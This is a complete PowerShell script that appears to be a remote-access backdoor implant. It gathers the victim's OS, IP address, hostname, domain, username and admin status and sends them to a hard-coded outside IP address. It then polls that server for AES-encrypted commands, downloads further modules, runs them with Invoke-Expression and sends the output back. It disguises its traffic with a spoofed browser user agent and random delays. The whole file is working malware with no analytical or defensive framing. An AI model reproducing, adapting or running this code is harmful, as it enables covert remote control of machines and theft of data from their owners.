$exchange=3
function CAM ($key,${IV}){

${a} = New-Object "System.Security.Cryptography.AesCryptoServiceProvider"
${a}.Mode = [System.Security.Cryptography.CipherMode]::CBC
${a}.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
${a}.BlockSize = 128
${a}.KeySize = 256
if (${IV})
{
if (${IV}.getType().Name -eq "String")
{${a}.IV = [System.Convert]::FromBase64String(${IV})}
else
{${a}.IV = ${IV}}
}
if ($key)
{
if ($key.getType().Name -eq "String")
{${a}.Key = [System.Convert]::FromBase64String($key)}
else
{${a}.Key = $key}
}
${a}}


function ENC ($key,${un},${file}=0){
if (${file} -eq 0){
${b} = [System.Text.Encoding]::UTF8.GetBytes(${un})}
else{
${b}=${un}}
${a} = CAM $key
${e} = ${a}.CreateEncryptor()
${f} = ${e}.TransformFinalBlock(${b}, 0, ${b}.Length)
[byte[]] ${p} = ${a}.IV + ${f}
[System.Convert]::ToBase64String(${p})
}


function DEC ($key,${enc},${file}=0){
${b} = [System.Convert]::FromBase64String(${enc})
${IV} = ${b}[0..15]
${a} = CAM $key ${IV}
$d = ${a}.CreateDecryptor()
$u = $d.TransformFinalBlock(${b}, 16, ${b}.Length - 16)
if (${file} -eq 0){
[System.Text.Encoding]::UTF8.GetString($u)
}
else{
return $u}
}



function load(${module})
      {

            ${modulename} = enc -key $key -{un} ${module}

            ${wc3} = new-object net.WebClient
            ${wc3}.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
            ${wc3}.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")

            try{
              ${postParams} = @{data=${modulename}}
                ${req}=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri http://51.68.215.173:50025/methods?page=${agent} -Method POST -Body ${postParams}
		${req}=${req}.Content
            }
            catch{
                ${postParams} = "data=${modulename}&resource=${agent}&b=0"
                ${wc3} = new-object net.WebClient
                ${wc3}.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
                ${wc3}.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
                ${req}=${wc3}.UploadString("http://51.68.215.173:50025/methods",${postParams})
                }


            $modulecontent=dec -key $key -{enc} ${req}


      return $modulecontent
      }

${hostname} = $env:COMPUTERNAME;
if ((New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){ ${t}="*"}
${whoami} = $env:USERNAME;
${whoami} ="${t}${whoami}"
${arch} = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
${os} = (Get-WmiObject -class Win32_OperatingSystem).Caption + "(${arch})";
${domain} = (Get-WmiObject Win32_ComputerSystem).Domain;
${IP}=(gwmi -query "Select IPAddress From Win32_NetworkAdapterConfiguration Where IPEnabled = True").IPAddress[0]
${random} = -join ((65..90) | Get-Random -Count 5 | % {[char]$_});
${agent}="${random}-img.jpeg"

${finaldata}="data=${os}**${IP}**${arch}**${hostname}**${domain}**${whoami}**$pid&${random}=${agent}"
${wc3} = new-object net.WebClient
      ${wc3}.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
      ${wc3}.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
      $key=${wc3}.UploadString("http://51.68.215.173:50025/query",${finaldata})
${progressPreference} = 'silentlyContinue';

${wc3} = New-Object system.Net.WebClient;

$windows=${agent}
while($true){
${seed}=[int](Get-Date -UFormat "%s")%97
${rand}=Get-Random -Minimum 50 -Maximum 250 -SetSeed ${seed}
${data}=-join ((65..90)*500 + (97..122)*500 | Get-Random -Count ${rand} | % {[char]$_});


try{
    ${postParams} = @{resource=${agent};authentication=${data}}
${enc}=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri http://51.68.215.173:50025/names -Method POST -Body ${postParams}
${enc}=${enc}.Content
}
 catch{
${postParams}="resource=${agent}&authentication=${data}"
        ${wc3} = new-object net.WebClient
      ${wc3}.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
      ${wc3}.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
      ${enc}=${wc3}.UploadString("http://51.68.215.173:50025/names",${postParams})
        }



if(${enc} -eq "REGISTER"){
${wc3} = new-object net.WebClient
      ${wc3}.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
      ${wc3}.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
      $key=${wc3}.UploadString("http://51.68.215.173:50025/query",${finaldata})
${progressPreference} = 'silentlyContinue';
continue
}
$reg=echo ${enc} | select-string -Pattern "\-\*\-\*\-\*"
if($reg)
#${enc} -eq "-")
{
${seed}=[int](Get-Date -UFormat "%s")
${min}=[int]$exchange/2+1
${max}=[int]$exchange+1
$exchange=Get-Random -Minimum ${min} -Maximum ${max} -SetSeed ${seed}
sleep $exchange
${date} = (Get-Date -Format "dd/MM/yyyy")
${date} = [datetime]::ParseExact(${date},"dd/MM/yyyy",$null)
${kdate} = [datetime]::ParseExact("13/06/2021","dd/MM/yyyy",$null)
if (${kdate} -lt ${date}) {kill $pid}
}
else{
${cm}=dec -key $key -{enc} ${enc}



if(${cm}.split(" ")[0] -eq "load"){
${f}=${cm}.split(" ")[1]
${module}=load -{module} ${f}
try{
${output}=Invoke-Expression (${module}) -ErrorVariable {badoutput} | Out-String
        }
        catch{
        ${output} = $Error[0] | Out-String;
        }
        if (${output}.Length -eq 0){
        ${output}="${output}${badoutput}"
        }


}
else{
try{
${output}=Invoke-Expression (${cm}) -ErrorVariable {badoutput} | Out-String
        }
        catch{
        ${output} = $Error[0] | Out-String;
        }
        if (${output}.Length -eq 0){
        ${output}="${output}${badoutput}"
        }}

  if (${output}.Length -eq 0){
${output}="${output}${badoutput}"
}

${redata}=enc -key $key -{un} ${output}






 try{
      ${postParams} = @{resource=${agent};data=${redata}}
${result}=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri http://51.68.215.173:50025/uddisoap -Method POST -Body ${postParams}
}
 catch{
 ${postParams} = "resource=${agent}&data=${redata}"
        ${wc3} = new-object net.WebClient
      ${wc3}.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
      ${wc3}.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
      ${result}=${wc3}.UploadString("http://51.68.215.173:50025/uddisoap","POST",${postParams})
        }

${result}=" "
${output}=" "
}
}
